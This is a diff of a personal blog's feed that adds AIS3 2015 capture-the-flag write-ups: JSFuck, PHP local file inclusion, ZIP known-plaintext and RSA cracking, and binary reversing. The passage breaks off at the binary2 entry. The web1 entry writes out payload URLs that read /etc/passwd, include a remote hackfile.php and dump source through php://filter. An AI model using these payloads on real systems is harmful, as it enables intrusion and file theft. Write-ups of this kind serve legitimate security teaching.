@@ -4,7 +4,7 @@
 <generator uri="https://github.com/mojombo/jekyll">Jekyll</generator>
 <link rel="self" type="application/atom+xml" href="//joyhuang9473.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="//joyhuang9473.github.io" />
-<updated>2015-09-11T21:20:07+08:00</updated>
+<updated>2015-09-12T11:06:23+08:00</updated>
 <id>//joyhuang9473.github.io/</id>
 <author>
   <name>YU-KAI HUANG</name>
@@ -230,6 +230,699 @@
 
 
 <entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: web2]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web2.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web2</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;jsfuck&quot;&gt;JSFuck&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以只用 6 個字符 []()!+ 來編寫 JavaScript 程序&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://www.jingwentian.com/t-413&lt;/li&gt;
+  &lt;li&gt;http://codegolf.stackexchange.com/questions/28714/convert-jsfuck-to-normal-js&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;剛開始看到 code 時覺得是 javascript，試著把它跑起來&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;!-- test.html --&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;/had&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;script&amp;gt;
+{ web2.txt }
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;結果出現了一個 ^_^ ，確定是一個可執行的 javascript&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;^_^
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;網路上得知 JSFuck，藉由他人所寫的 script ，把 jsfuck 轉換為一般 javaScript&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;!- jsfuck-decoder.html -&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;/had&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;script&amp;gt;
+alert(/\n(.+)/.exec(eval(prompt().slice(0,-2)))[1]);
+&amp;lt;/script&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;輸出結果&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/uGgznIH.png&quot; alt=&quot;jsfuck_in-ais3&#39;s_web_question&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web2.html&quot;&gt;AIS3 2015 Writeup: web2&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: web1]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web1.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web1</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;local-file-inclusion-lfi-vulnerability&quot;&gt;Local File Inclusion (LFI) vulnerability&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;php:// — Accessing various I/O streams&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://security.stackexchange.com/questions/90724/reading-php-comments-using-php-page-that-open-text-files-ctf&lt;/li&gt;
+  &lt;li&gt;https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Base64 Online Decode https://www.base64decode.org/&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;瀏覽 http://52.69.163.194/web1/?page=about 發現內容是 include 自 about.php&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+http://52.69.163.194/web1/about.php
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;發現輸入相對路徑去讀取檔案是不可行的，php 出錯而沒有輸出結果&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+http://52.69.163.194/web1/?page=../web1/about
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;想要讀取 /etc/passwd 也不可行&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+http://52.69.163.194/web1/?page=/etc/passwd 
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;嘗試 include remote file 也不可行，allow_url_include 可能沒有開&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+http://52.69.163.194/web1/?page=http://somewhere/hackfile.php
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;最後解法是透過 php://filter 強迫 php 在 include file 之前，先把該檔案用 base64 編碼，之後網頁就吐出一堆 base64 文字串，再將文字串拿去 decode，就可以看到 php 原始碼，flag 就藏在裡面&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://52.69.163.194/web1/?page=php://filter/convert.base64-encode/resource=index
+
+PGEgaHJlZj0nP3BhZ2U9YWJvdXQnPiBhYm91dCA8L2E+IDxiciAvPgo8YSBocmVmPSc/cGFnZT10ZXN0Jz4gdGVzdCA8L2E+IDxiciAvPgo8YnI+Cjxicj4KPD9waHAKCiAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOwoKICAgICAgICAkcGFnZSA9ICRwYWdlIC4gJy5waHAnOwogICAgICAgICRwYWdlID0gc3RyX3JlcGxhY2UoIi4uLyIsICIiLCAkcGFnZSk7CiAgICAgICAgaW5jbHVkZSggJHBhZ2UgKTsKCiAgICAgICAgLy8gdGhlIGtleSBpcyBBSVMze3BocF93cmFwcGVyX3JvY2tzfQ==
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;decode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;a href=&#39;?page=about&#39;&amp;gt; about &amp;lt;/a&amp;gt; &amp;lt;br /&amp;gt;
+&amp;lt;a href=&#39;?page=test&#39;&amp;gt; test &amp;lt;/a&amp;gt; &amp;lt;br /&amp;gt;
+&amp;lt;br&amp;gt;
+&amp;lt;br&amp;gt;
+&amp;lt;?php
+
+        $page = $_GET[&#39;page&#39;];
+
+        $page = $page . &#39;.php&#39;;
+        $page = str_replace(&quot;../&quot;, &quot;&quot;, $page);
+        include( $page );
+
+        // the key is AIS3{php_wrapper_rocks}
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-web1.html&quot;&gt;AIS3 2015 Writeup: web1&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: pwn3d1]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-pwn3d1.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-pwn3d1</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;buffer-overflow-attack&quot;&gt;Buffer Overflow Attack&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;stack&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;pwntool&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;sub_4006AD:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/uPnmKhO.png&quot; alt=&quot;pwn1_asm_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/ed2urWa.png&quot; alt=&quot;pwn1_boa_in_ais3&#39;s_pwn3d_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;stack ??&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-----ret-----
+4
+----var_4----
+16
+----var_20---
+4
+-----rbp-----
+20
+-----rsp-----
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-pwn3d1.html&quot;&gt;AIS3 2015 Writeup: pwn3d1&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: misc3]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc3.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc3</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;file-extension&quot;&gt;File extension&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;gzip, tar, bmp&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;stegsolve.jar: A steganographic image analyzer, solver and data extractor for challanges.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;查看 c4 檔案類型&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ file c4
+
+c4: gzip compressed data, from Unix
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;重新命名 c4 為 c4.gz&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gzip -d c4
+
+gzip: c4: unknown suffix -- ignored
+
+$ mv c4 c4.gz
+$ gzip -d c4.gz
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;解壓出一個 tar archive 的 c4，且 c4 裡面又包了 c4 ，為避免 overwrite ，改名再解壓&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ tar -zxvf c4
+
+x c4: Refusing to overwrite archive
+tar: Error exit delayed from previous errors.
+
+$ tar -tvf c4
+-rw-rw-r--  0 orange orange 345654 Jul 21 18:02 c4
+
+$ mv c4 c4.tar
+$ tar -zxvf c4.tar
+
+x c4
+
+$ file c4
+
+c4: PC bitmap, Windows 3.x format, 480 x 240 x 24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此時 c4 為 bmp 圖片檔，隱約可以看到有字位於左下角&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/LDlMjBq.png&quot; alt=&quot;c4_bmp_in_ais3&#39;s_misc_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;利用 stegsolve.jar 去處理圖片，在 Red plane 2 模式時就可以清楚看到字了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://imgur.com/ALDem6N.png&quot; alt=&quot;c4_solved_bmp_in_ais3&#39;s_misc_question&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc3.html&quot;&gt;AIS3 2015 Writeup: misc3&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: misc2]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc2.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc2</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;known-plaintext-attack&quot;&gt;Known-plaintext attack&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;cracking ZIP Files&lt;/li&gt;
+  &lt;li&gt;you need to have one of the original files contained in the encrypted archive&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://www.hackthis.co.uk/articles/known-plaintext-attack-cracking-zip-files&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;pkcrack&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;一開始先確認 facebook.zip 為 zip 檔&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ file facebook.zip
+
+facebook.zip: Zip archive data, at least v1.0 to extract
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;打開後發現有加密，試著看壓縮檔裡面有什麼檔案&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ unzip -l facebook.zip
+
+Archive:  facebook.zip
+  Length     Date   Time    Name
+ --------    ----   ----    ----
+       38  07-15-15 18:15   key.txt
+        0  07-15-15 18:13   p960x960/
+    26664  10-30-13 08:19   p960x960/851556_443281069111871_602278786_n.png
+ --------                   -------
+    26702                   3 files
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;藉由網路上的教學&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;you need to have one of the original files contained in the encrypted archive
+What you are going to do with it is you are going to compress it using the same compression method as the protected file. Remember this, otherwise it won’t work. So after you do that, move both your zip files, the encrypted one and the plaintext zip&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;去 google 找 851556_443281069111871_602278786_n.png&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-prn1/p960x960/851556_443281069111871_602278786_n.png&quot; alt=&quot;851556_443281069111871_602278786_n.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;壓縮該檔案（包含完整路徑）&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ zip -r plaintext.zip p960x960/851556_443281069111871_602278786_n.png
+$ file plaintext.zip
+
+Archive:  plaintext.zip
+  Length     Date   Time    Name
+ --------    ----   ----    ----
+    26664  07-25-15 00:09   p960x960/851556_443281069111871_602278786_n.png
+ --------                   -------
+    26664                   1 file
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;執行 pccrack&lt;/p&gt;
+
+&lt;p&gt;pkcrack -C facebook.zip -c “p960x960/851556_443281069111871_602278786_n.png” -P plaintext.zip -p “p960x960/851556_443281069111871_602278786_n.png” -d decrypted.zip -a&lt;/p&gt;
+
+&lt;p&gt;解壓縮 decrypted.zip，裡面的 key.txt 就放著 flag&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-misc2.html&quot;&gt;AIS3 2015 Writeup: misc2&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: crypto2]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto2.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto2</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;rsa-cracking&quot;&gt;RSA Cracking&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;a 768 bit RSA crack when all you have is the file you want to decrypt, and the public key&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://m0x39.blogspot.tw/2012/12/0x00-introduction-this-post-is-going-to.html&lt;/li&gt;
+  &lt;li&gt;http://blog.orange.tw/2014/10/hack-in-box-2014-ctf-writeup-keygenme.html&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;rsatool.py: https://github.com/ius/rsatool.git&lt;/li&gt;
+  &lt;li&gt;Factordb: http://www.factordb.com&lt;/li&gt;
+  &lt;li&gt;rsacrack.py:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;usage: cat file&lt;/td&gt;
+      &lt;td&gt;python rsacrack.py -d [private key exponent] [public key modulus]&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;script src=&quot;https://gist.github.com/joyhuang9473/d77f9428d3c507989714.js&quot;&gt;&lt;/script&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;p = randomly chosen prime&lt;/li&gt;
+  &lt;li&gt;q = randomly chosen prime&lt;/li&gt;
+  &lt;li&gt;n = modulus for public and private keys(n=pq)&lt;/li&gt;
+  &lt;li&gt;f(n)=(p-1)(q-1) :: f(n) counts the number of positive integers less than or equal to n that are relatively prime to n&lt;/li&gt;
+  &lt;li&gt;e = exponent (chosen as 1 &amp;lt; e &amp;lt; f(n) &amp;amp;&amp;amp; greatest common divisor of (e, f(n)) = 1… so e and f(n) are coprime) this is the public key exponent&lt;/li&gt;
+  &lt;li&gt;d = e^-1(mod f(n)) or (de) = 1 mod f(n)  — this is the private key exponent&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;在 rsa.py 裡已經有 public key 的 n, e ，藉由 &lt;a href=&quot;http://www.factordb.com&quot; title=&quot;Factordb&quot;&gt;Factordb&lt;/a&gt; 找出 p,q 兩個大質數&lt;/p&gt;
+
+&lt;p&gt;使用 rsatool.py 找出 private key 的 n, d&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ python rsatool.py -p 800644567978575682363895000391634967 -q 83024947846700869393771322159348359271173 -n 66473473500165594946611690873482355823120606837537154371392262259669981906291 -e 65537
+Using (p, q) to initialise RSA instance
+
+n =
+92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573
+
+e = 65537 (0x10001)
+
+d =
+480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659
+
+p = 800644567978575682363895000391634967 (0x9a32d32db1c5be9aeac5de0daa5017)
+
+q =
+f3fd0751a4697130a74c96ce57bad29305
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;p.s 83024947846700869393771322159348359271173 (0xf3fd0751a4697130a74c96ce57bad29305)&lt;/p&gt;
+
+&lt;p&gt;使用 rsacrack.py&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ cat flag.enc | python rsacrack.py -d 480c35d4888c65e8073f81e424ff42c28879294c3c4954a295bf3880decf0659 92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573 | strings
+AIS3{rsaaaaaaaaA_orz}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;p.s&lt;/p&gt;
+
+&lt;p&gt;n = 0x92f6a717a4ca87fbb4e008b2ba036d8fc5ca22c8bb61060fef170ce6792ec573
+= 66473473500165594946611690873482355823120606837537154371392262259669981906291&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto2.html&quot;&gt;AIS3 2015 Writeup: crypto2&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: crypto1]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto1.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto1</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;reference&quot;&gt;Reference:&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;filename&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Vigenere Cipher Decoder http://www.dcode.fr/vigenere-cipher&lt;/li&gt;
+  &lt;li&gt;Vigenère Cipher Codebreaker http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;藉由第一個連結找出可能的 key length，再由第二個連結，設定 key size 後找出所有的可能，並搜尋 “the key is” 找出可辨識的字串&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/IdI4AD1.png&quot; alt=&quot;vigenere_key_length_in_ais3&#39;s_crypto_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/xhFbfMR.png&quot; alt=&quot;vigenere_decode_in_ais3&#39;s_crypto_question&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-crypto1.html&quot;&gt;AIS3 2015 Writeup: crypto1&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: binary3]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary3.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary3</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;bit-assembly-code&quot;&gt;64bit assembly code&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;little endian&lt;/li&gt;
+  &lt;li&gt;xor&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ida64&lt;/li&gt;
+  &lt;li&gt;XOR Calculator online https://xor.pw/&lt;/li&gt;
+  &lt;li&gt;Hex to ASCII text converter http://www.rapidtables.com/convert/number/hex-to-ascii.htm&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;主要觀察 check1, check2, gg function&lt;/p&gt;
+
+&lt;p&gt;check1:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/MxSrGW4.png&quot; alt=&quot;stupid_v2_check1_func_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;check2:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/kTJEAKj.png&quot; alt=&quot;stupid_v2_check2_func_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;gg:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/8crNjMj.png&quot; alt=&quot;stupid_v2_gg_func_in_ais3&#39;s_binary_question&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在 check1 時，to_reg function 會將 input 存入 rdx，key 的值為 0DDDDAAAADADADDAAh，經過運算：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;key = (input) XOR 0DDDDAAAADADADDAAh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;進入 check2 ，call gg function 並且 ax = 0 時即可進到正確的段落 “Yeah, It’s a flag !!! …”&lt;/p&gt;
+
+&lt;p&gt;進入 gg function，分兩次檢查 key 的值，總之 key 的值要為 0BFB7B8CEh 和 0BCB4DEC4h 的連接&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;key = (input) XOR 0DDDDAAAADADADDAAh
+    = 0BCB4DEC4BFB7B8CEh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;所以可得 input 值為 06169746e656d6564h 並拿去轉成 ascii，注意 little endian，反向讀取:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;dementia
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;得到一個癡呆 :)&lt;/p&gt;
+
+&lt;p&gt;flag: AIS3{dementia}&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary3.html&quot;&gt;AIS3 2015 Writeup: binary3&lt;/a&gt; was originally published by YU-KAI HUANG at &lt;a href=&quot;//joyhuang9473.github.io&quot;&gt;YU KAI'S BLOG&lt;/a&gt; on July 27, 2015.&lt;/p&gt;
+  </content>
+</entry>
+
+
+<entry>
+  <title type="html"><![CDATA[AIS3 2015 Writeup: binary2]]></title>
+ <link rel="alternate" type="text/html" href="//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary2.html" />
+  <id>//joyhuang9473.github.io/post-ctf/2015/07/27/ais3-writeup-binary2</id>
+  <published>2015-07-27T12:00:00+08:00</published>
+  <updated>2015-07-27T12:00:00+08:00</updated>
+  <author>
+    <name>YU-KAI HUANG</name>
+    <uri>//joyhuang9473.github.io</uri>
+    <email>joyhuang@ags.tw</email>
+  </author>
+  <content type="html">
+    &lt;h2 id=&quot;shellcode-to-bin&quot;&gt;Shellcode to bin&lt;/h2&gt;
+
+&lt;p&gt;Keynote:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;shellcode&lt;/li&gt;
+  &lt;li&gt;xor&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Reference:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://theloshackers.blogspot.tw/2013/08/convert-hex-shellcode-to-binary-mode.html&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tools:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;ida64&lt;/li&gt;
+  &lt;li&gt;XOR Calculator online https://xor.pw/&lt;/li&gt;
+  &lt;li&gt;Hex to ASCII text converter http://www.rapidtables.com/convert/number/hex-to-ascii.htm&lt;/li&gt;
+&lt;/ul&gt;
+
